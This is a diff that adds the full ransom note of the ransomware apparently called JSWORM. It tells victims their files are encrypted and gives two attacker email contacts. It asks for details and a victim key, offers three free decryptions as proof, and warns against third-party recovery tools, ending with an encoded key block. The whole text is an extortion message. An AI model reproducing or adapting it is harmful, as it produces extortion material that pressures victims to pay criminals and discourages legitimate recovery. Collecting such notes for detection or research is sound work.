@@ -1,0 +1,29 @@
+All your files were encrypted!
+Your personal ID: ----------
+
+>>> Contacts:
+    remarkpaul77@cock.li
+    alfred.helper@keemail.com (in case of no answer)
+
+>>> What should I include in my message?
+1. Country
+2. List of encrypted drives and their size
+3. Extension of encrypted files (.[ID-----------][remarkpaul77@cock.li].JSWORM)
+4. JSWORM PUBLIC KEY (below)
+
+
+>>> Free decryption as guarantee!
+Before paying you send us up to 3 files for free decryption.
+We recommeded to send pictures, text files, sheets, etc. (files no more than 1mb)
+
+
+>>> ATTENTION!
+1. Do not rename encrypted files.
+2. Do not try to decrypt your data using third party software, it may cause permanent data loss.
+3. Decryption of your files with the help of third parties may cause increased price (they add their fee to 
+our) or you can become a victim of a scam.
+
+
+-------BEGIN JSWORM PUBLIC KEY-------
+eXVjfXdgfHdgfHNpcXNhcXFmcXITcXFmcQJgPjA0OQ==
+-------END JSWORM PUBLIC KEY-------
